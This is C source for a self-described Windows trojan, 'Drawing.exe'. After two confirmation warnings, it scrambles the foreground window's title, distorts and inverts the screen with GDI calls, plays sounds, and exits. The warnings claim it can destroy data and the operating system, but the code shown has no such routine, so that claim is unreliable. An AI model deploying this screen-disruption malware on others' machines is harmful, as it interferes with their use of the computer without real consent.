#include "main.h"
#include "sound.h"

DWORD WINAPI garbled(LPVOID lpParam)
{
    int uVar1;
    HWND hWnd;
    int iVar2;
    uint uVar3;
    CHAR* lpString;
    CHAR local_9;
    do {
        iVar2 = 0;
        do {
            uVar1 = rdtsc();
            uVar3 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
            uVar3 = uVar3 ^ uVar3 << 0x11;
            (&local_9)[iVar2] = (CHAR)((ulonglong)(uVar3 << 5 ^ uVar3) % 0x47);
            iVar2 = iVar2 + 1;
        } while (iVar2 < 0x46);
        lpString = &local_9;
        hWnd = GetForegroundWindow();
        SetWindowTextA(hWnd, lpString);
        Sleep(10);
    } while (true);
}

//payload1

DWORD WINAPI gdi1(LPVOID lpParam)
{
    HDC hdc = GetDC(0);
    int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
    while (1)
    {
        hdc = GetDC(0);
        BitBlt(hdc, -20, 0, x, y, hdc, 0, 0, SRCCOPY);
        BitBlt(hdc, x - 20, 0, x, y, hdc, 0, 0, NOTSRCCOPY);
        Sleep(100);
    }
}

//payload2

DWORD WINAPI gdi2(LPVOID lpParam)
{
    HDC hDC;
    tagCURSORINFO local_28;
    tagPOINT local_14;
    uint local_c;
    hDC = GetDC((HWND)0x0);
    HDC hdc = GetDC(0);
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    int rx;
    int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
    double moveangle = 0;
    while (1)
    {
        desk = GetDC(0);
        hdc = GetDC(0);
        SeedXorshift32(__rdtsc());
        rx = xorshift32() % sw;
        int ry = xorshift32() % sh;
        if (xorshift32() % 5 == 3) InvalidateRect(0, 0, 0);
        int ax = (int)(cos(moveangle) * 1);
        int ay = (int)(sin(moveangle) * 1);
        BitBlt(desk, ax, ay, sw, sh, desk, 0, 0, SRCPAINT);
        moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
        SeedXorshift32(__rdtsc());
        GetCursorPos(&local_14);
        local_28.cbSize = 0x14;
        GetCursorInfo(&local_28);
        Sleep(5);
    }
}

DWORD WINAPI gdi3(LPVOID lpParam)
{
    int uVar1;
    ulonglong uVar2;
    uint uVar3;
    uint uVar4;
    HDC hdc;
    uint uVar5;
    uint x1;
    uint y1;
    uint uVar6;
    int cx;
    int local_14;
    int local_10;

    uVar3 = GetSystemMetrics(0);
    uVar4 = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    do {
        do {
            while (true) {
                uVar1 = rdtsc();
                uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
                uVar5 = uVar5 ^ uVar5 << 0x11;
                x1 = (uVar5 << 5 ^ uVar5) % uVar3;
                uVar1 = rdtsc();
                uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
                uVar5 = uVar5 ^ uVar5 << 0x11;
                y1 = (uVar5 << 5 ^ uVar5) % uVar4;
                uVar2 = rdtsc();
                uVar5 = (uint)uVar2 & 3;
                uVar1 = rdtsc();
                uVar6 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
                uVar6 = uVar6 ^ uVar6 << 0x11;
                uVar1 = rdtsc();
                cx = (uVar6 ^ uVar6 << 5) % 300 + 200;
                uVar6 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
                uVar6 = uVar6 ^ uVar6 << 0x11;
                uVar6 = (uVar6 ^ uVar6 << 5) % 0x32;
                if ((uVar2 & 3) == 0) break;
                if (uVar5 == 1) {
                    local_10 = 0;
                    uVar5 = y1;
                    if (uVar6 != 0xffffffec) {
                        do {
                            BitBlt(hdc, local_10 + x1, uVar5, cx, cx, hdc, x1, y1, SRCCOPY);
                            Sleep(1);
                            local_10 = local_10 + 10;
                            uVar5 = uVar5 - 10;
                        } while (local_10 < (int)(uVar6 + 0x14));
                    }
                }
                else if (uVar5 == 2) {
                    local_14 = 0;
                    uVar5 = x1;
                    if (uVar6 != 0xffffffec) {
                        do {
                            BitBlt(hdc, uVar5, y1 + local_14, cx, cx, hdc, x1, y1, SRCCOPY);
                            Sleep(1);
                            local_14 = local_14 + 10;
                            uVar5 = uVar5 - 10;
                        } while (local_14 < (int)(uVar6 + 0x14));
                    }
                }
                else if ((uVar5 == 3) && (uVar6 != 0xffffffec)) {
                    local_14 = (uVar6 + 0x13) / 10 + 1;
                    uVar5 = x1;
                    do {
                        BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, SRCCOPY);
                        Sleep(1);
                        uVar5 = uVar5 - 10;
                        local_14 = local_14 + -1;
                    } while (local_14 != 0);
                }
            }
        } while (uVar6 == 0xffffffec);
        local_10 = (uVar6 + 0x13) / 10 + 1;
        uVar5 = x1;
        do {
            BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, SRCCOPY);
            Sleep(1);
            uVar5 = uVar5 + 10;
            local_10 = local_10 + -1;
        } while (local_10 != 0);
    } while (true);
}

DWORD WINAPI gdi4(LPVOID lpParam)
{
    ulonglong uVar1;
    int uVar2;
    uint uVar3;
    uint uVar4;
    HDC hDC;
    uint uVar5;
    HICON pHVar6;
    void* extraout_ECX;
    void* extraout_ECX_00;
    void* extraout_ECX_01;
    void* extraout_ECX_02;
    int extraout_EDX;
    uint uVar7;
    int extraout_EDX_00;
    int extraout_EDX_01;
    int extraout_EDX_02;
    int iVar8;
    double dVar9;
    int Y;
    uint Y_00;
    double local_18;
    double local_10;

    uVar3 = GetSystemMetrics(0);
    uVar4 = GetSystemMetrics(1);
    hDC = GetDC((HWND)0x0);
    do {
        do {
            while (true) {
                uVar1 = rdtsc();
                local_10 = 0.0;
                local_18 = 0.0;
                uVar5 = (uint)uVar1 & 3;
                if ((uVar1 & 3) == 0) break;
                if (uVar5 == 1) {
                    uVar2 = rdtsc();
                    uVar7 = (uint)uVar2 ^ (uint)uVar2 << 0xd;
                    uVar7 = uVar7 ^ uVar7 << 0x11;
                    for (uVar5 = uVar3; 0 < (int)uVar5; uVar5 = uVar5 - 3) {
                        pHVar6 = LoadIconW((HINSTANCE)0x0, (LPCWSTR)0x7f03);
                        dVar9 = local_18;
                        (extraout_ECX_00, extraout_EDX_00);
                        DrawIcon(hDC, uVar5, (int)(dVar9 * local_10 + (double)((uVar7 << 5 ^ uVar7) % uVar4)),
                            pHVar6);
                        local_18 = local_18 + 0.05;
                        local_10 = local_10 + 0.32;
                        Sleep(5);
                    }
                }
                else if (uVar5 == 2) {
                    uVar2 = rdtsc();
                    iVar8 = 0;
                    uVar5 = (uint)uVar2 ^ (uint)uVar2 << 0xd;
                    uVar5 = uVar5 ^ uVar5 << 0x11;
                    if (0 < (int)uVar4) {
                        do {
                            pHVar6 = LoadIconW((HINSTANCE)0x0, (LPCWSTR)0x7f04);
                            dVar9 = local_18;
                            Y = iVar8;
                            (extraout_ECX_01, extraout_EDX_01);
                            DrawIcon(hDC, (int)(dVar9 * local_10 + (double)((uVar5 << 5 ^ uVar5) % uVar3)), Y, pHVar6);
                            local_18 = local_18 + 0.05;
                            local_10 = local_10 + 0.32;
                            Sleep(5);
                            iVar8 = iVar8 + 3;
                        } while (iVar8 < (int)uVar4);
                    }
                }
                else if (uVar5 == 3) {
                    uVar2 = rdtsc();
                    uVar7 = (uint)uVar2 ^ (uint)uVar2 << 0xd;
                    uVar7 = uVar7 ^ uVar7 << 0x11;
                    for (uVar5 = uVar4; 0 < (int)uVar5; uVar5 = uVar5 - 3) {
                        pHVar6 = LoadIconW((HINSTANCE)0x0, (LPCWSTR)0x7f02);
                        dVar9 = local_18;
                        Y_00 = uVar5;
                        (extraout_ECX_02, extraout_EDX_02);
                        DrawIcon(hDC, (int)(dVar9 * local_10 + (double)((uVar7 << 5 ^ uVar7) % uVar3)), Y_00,
                            pHVar6);
                        local_18 = local_18 + 0.05;
                        local_10 = local_10 + 0.32;
                        Sleep(5);
                    }
                }
            }
            uVar2 = rdtsc();
            uVar5 = (uint)uVar2 ^ (uint)uVar2 << 0xd;
            uVar5 = uVar5 ^ uVar5 << 0x11;
            iVar8 = 0;
        } while ((int)uVar3 < 1);
        do {
            pHVar6 = LoadIconW((HINSTANCE)0x0, (LPCWSTR)0x7f01);
            dVar9 = local_18;
            (extraout_ECX, extraout_EDX);
            DrawIcon(hDC, iVar8, (int)(dVar9 * local_10 + (double)((uVar5 << 5 ^ uVar5) % uVar4)), pHVar6);
            local_18 = local_18 + 0.05;
            local_10 = local_10 + 0.32;
            Sleep(5);
            iVar8 = iVar8 + 3;
        } while (iVar8 < (int)uVar3);
    } while (true);
}

DWORD WINAPI gdi5(LPVOID lpParam)
{
    int uVar1;
    int uVar2;
    int uVar3;
    int uVar4;
    uint uVar5;
    uint uVar6;
    HDC hdc;
    uint uVar7;
    uint uVar8;

    uVar5 = GetSystemMetrics(0);
    uVar6 = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    do
    {
        uVar1 = rdtsc();
        uVar2 = rdtsc();
        uVar3 = rdtsc();
        uVar7 = (uint)uVar3 ^ (uint)uVar3 << 0xd;
        uVar7 = uVar7 ^ uVar7 << 0x11;
        uVar3 = rdtsc();
        uVar8 = (uint)uVar3 ^ (uint)uVar3 << 0xd;
        uVar8 = uVar8 ^ uVar8 << 0x11;
        uVar3 = rdtsc();
        uVar4 = rdtsc();
        BitBlt(hdc, (uint)uVar4 & 5, (uint)uVar3 & 5, (uVar8 << 10 ^ uVar8) % uVar5,
        (uVar7 << 10 ^ uVar7) % uVar6, hdc, (uint)uVar2 & 5, (uint)uVar1 & 5, SRCCOPY);
    } while (true);
}

DWORD WINAPI gdi6(LPVOID lpParam)
{
    HDC desk = GetDC(0);
    int x = GetSystemMetrics(0);
    int y = GetSystemMetrics(1);

    while (1)
    {
        desk = GetDC(0);
        PatBlt(desk, 0, 0, x, y, PATINVERT);
        Sleep(10000);
    }
}

DWORD WINAPI gdi7(LPVOID lpParam)
{
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    LPCSTR text = 0;
    while (1)
    {
        desk = GetDC(0);
        SeedXorshift32(__rdtsc());
        text = "Drawing Drawing";
        SetBkMode(desk, TRANSPARENT);
        SetTextColor(desk, RGB(0, 0, 500));
        HFONT font = CreateFontA(350, 112, 0, 0, FW_THIN, 0, rand() % 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Shadows Into Light");
        SelectObject(desk, font);
        TextOutA(desk, sw - 1925, sh - 1050, text, strlen(text));
        TextOutA(desk, sw - 1925, sh - 400, text, strlen(text));
        ReleaseDC(GetDesktopWindow(), desk);
        DeleteDC(desk);
        DeleteObject(font);
        Sleep(250);
    }
}

VOID WINAPI gdi8_sab(int x, int y, int w, int h)
{
    HWND hwnd = NULL;
    HDC hdc = GetDC(hwnd);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
    DeleteObject(hrgn);
    ReleaseDC(hwnd, hdc);
}

DWORD WINAPI gdi8(LPVOID lpParam)
{
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    while (1)
    {
        SeedXorshift32(__rdtsc());
        desk = GetDC(0);
        RECT rect;
        GetWindowRect(GetDesktopWindow(), &rect);
        int w = rect.right - rect.top - 500, h = rect.bottom - rect.top - 500;
        const int size = 1000;
        int x = xorshift32() % (w + size) - size / 2, y = xorshift32() % (h + size) - size / 2;
        for (int i = 0; i < size; i += 100)
        {
            gdi8_sab(x - i / 2, y - i / 2, i, i);
        }
        Sleep(50);
        RedrawWindow(0, 0, 0, 133);
    }
}

DWORD WINAPI gdi9(LPVOID lpParam)
{
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    HDC hdc, hdcMem; HBITMAP hbm;
    for (int i = 0;; i++, i %= 6)
    {
        hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc);
        hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
            int x = i * w + i, y = i * h + i, f = (y | y + y + -1 + x + w / h);
            ((BYTE*)(data + i))[4] = 1;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCINVERT);
        DeleteObject(hbm); DeleteObject(hdcMem);
        DeleteObject(hdc);
        Sleep(350);
    }
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
    //WARNING

    if (MessageBoxW(NULL, L"!!!WARNING!!!\n\nYou have ran a Trojan known as Drawing.exe that has full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?", L"Drawing.exe - !!!WARNING!!! ", MB_ICONWARNING | MB_YESNO) != IDYES)
        return false;

    if (MessageBoxW(NULL, L"!!!FINAL WARNING!!!\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue?\nThis is your final chance to stop this program from execution.", L"Drawing.exe - !!!FINAL WARNING!!!", MB_ICONWARNING | MB_YESNO) != IDYES)
        return false;
    //Default GDI

    CreateThread(0, 0, garbled, 0, 0, 0);
    sound1();
    HANDLE thread1 = CreateThread(0, 0, gdi1, 0, 0, 0);
    Sleep(5000);
    TerminateThread(thread1, 0);
    CloseHandle(thread1);
    RedrawWindow(0, 0, 0, 133);
    HANDLE thread2 = CreateThread(0, 0, gdi2, 0, 0, 0);
    Sleep(5000);
    HANDLE thread3 = CreateThread(0, 0, gdi3, 0, 0, 0);
    HANDLE thread4 = CreateThread(0, 0, gdi4, 0, 0, 0);
    Sleep(15000);
    TerminateThread(thread2, 0);
    CloseHandle(thread2);
    TerminateThread(thread3, 0);
    CloseHandle(thread3);
    TerminateThread(thread4, 0);
    CloseHandle(thread4);
    RedrawWindow(0, 0, 0, 133);
    HANDLE thread5 = CreateThread(0, 0, gdi5, 0, 0, 0);
    HANDLE thread6 = CreateThread(0, 0, gdi6, 0, 0, 0);
    Sleep(5000);
    HANDLE thread7 = CreateThread(0, 0, gdi7, 0, 0, 0);
    Sleep(15000);
    TerminateThread(thread5, 0);
    CloseHandle(thread5);
    TerminateThread(thread6, 0);
    CloseHandle(thread6);
    TerminateThread(thread7, 0);
    CloseHandle(thread7);
    RedrawWindow(0, 0, 0, 133);
    sound2();
    HANDLE thread8 = CreateThread(0, 0, gdi8, 0, 0, 0);
    HANDLE thread9 = CreateThread(0, 0, gdi9, 0, 0, 0);
    Sleep(20000);
    exit(1);
    while (1) {}
}